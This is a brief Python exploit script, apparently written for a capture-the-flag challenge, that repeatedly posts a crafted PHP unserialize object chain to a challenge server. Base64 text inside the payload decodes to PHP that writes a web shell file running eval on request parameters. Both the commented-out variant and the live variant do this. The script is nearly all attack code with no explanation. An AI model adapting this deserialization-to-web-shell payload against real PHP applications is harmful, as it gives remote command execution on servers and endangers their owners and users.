import requests as rq

# while True:
#     a = rq.post("http://eci-2zeah5zzqqi7wc9s9oyl.cloudeci1.ichunqiu.com/", data={
#         "Harder":b"O:3:\"ENV\":3:{s:3:\"key\";N;s:5:\"value\";N;s:4:\"math\";O:4:\"DIFF\":3:{s:8:\"callback\";O:3:\"FUN\":2:{s:3:\"fun\";O:4:\"FILE\":2:{s:8:\"filename\";s:8:\"back.php\";s:10:\"enviroment\";N;}s:5:\"value\";s:84:\"PD9waHAgZmlsZV9wdXRfY29udGVudHMoInNoZWxsLnBocCIsIjw/PWV2YWwoXCRfUkVRVUVTVFswXSk7Iik7\";}s:4:\"back\";N;s:10:\"\x00DIFF\x00flag\";N;}}"
#     })

while True:
    a = rq.post("http://eci-2zeah5zzqqi7wc9s9oyl.cloudeci1.ichunqiu.com/", data={
        "Harder":b"O:3:\"ENV\":3:{s:3:\"key\";N;s:5:\"value\";N;s:4:\"math\";O:4:\"DIFF\":3:{s:8:\"callback\";O:3:\"FUN\":2:{s:3:\"fun\";O:4:\"FILE\":2:{s:8:\"filename\";s:8:\"back.php\";s:10:\"enviroment\";N;}s:5:\"value\";s:120:\"PD9waHAgZmlsZV9wdXRfY29udGVudHMoImFiY2RlLnBocCIsIjw/PWhpZ2hsaWdodF9maWxlKF9fRklMRV9fKTtldmFsKFwkX0dFVFtgY21kYF0pOyIpOw==\";}s:4:\"back\";N;s:10:\"\x00DIFF\x00flag\";N;}}"
    })